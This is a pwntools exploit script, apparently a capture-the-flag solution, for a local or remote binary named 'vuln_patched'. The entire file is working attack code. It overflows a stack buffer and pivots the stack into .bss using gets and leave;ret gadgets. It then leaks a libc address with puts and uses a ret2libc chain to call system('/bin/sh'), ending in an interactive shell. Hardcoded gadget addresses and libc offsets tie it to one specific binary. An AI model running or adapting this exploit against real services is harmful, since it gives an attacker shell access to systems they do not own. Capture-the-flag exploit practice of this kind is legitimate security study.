#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg

continue
"""
# b*0x0401227
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")
exe = "./vuln_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

bss = 0x404700
leave = 0x00000000004011cd #: leave ; ret
gets = 0x0401205
puts = 0x0401211
ret = 0x000000000040101a #: ret
pop_rbp = 0x40115d #: pop rbp ; ret
payload = flat(
    b'A' * 32,
    bss,
    gets,
    leave,
    )

sl(payload)

payload2 = flat(
    b'A' * 8,
    b'B' * 8,
    b'C' * 8,
    b'D' * 8,
    0x404038 + 0x20,
    gets
    )
input("Send 2?")
sl(payload2)

payload3 = flat(
    pop_rbp,
    0x404168 - 0x8,
    leave,
    b'D' * 8,
    0x404300 + 0x20
    )
payload3 += p64(ret) * 0x20 + p64(gets)
payload3 += flat(
    pop_rbp,
    0x404a00,
    gets
    )
input("Send 3?")
sl(payload3)

payload4 = flat(
    b'A' * 8,
    b'B' * 8,
    b'C' * 8,
    b'D' * 8,
    0x404010 + 0x20,
    puts
    )
input("Send 4?")
sl(payload4)
io.recvline()
io.recvline()
io.recvline()
io.recvline()
libc_leak = u64(io.recv(6).ljust(8, b'\00'))
libc.address = libc_leak - 0x87be0
info(hex(libc.address))

pop_rdi = libc.address + 0x000000000010f75b #: pop rdi ; ret

payload5 = flat(
    b'A' * 0x28,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    libc.sym.system
    )
input("Send 5?")
sl(payload5)

io.interactive()

#.;,;.{aaaaaaa_(╯°□°)╯︵ ┻━┻_aaaaaaa}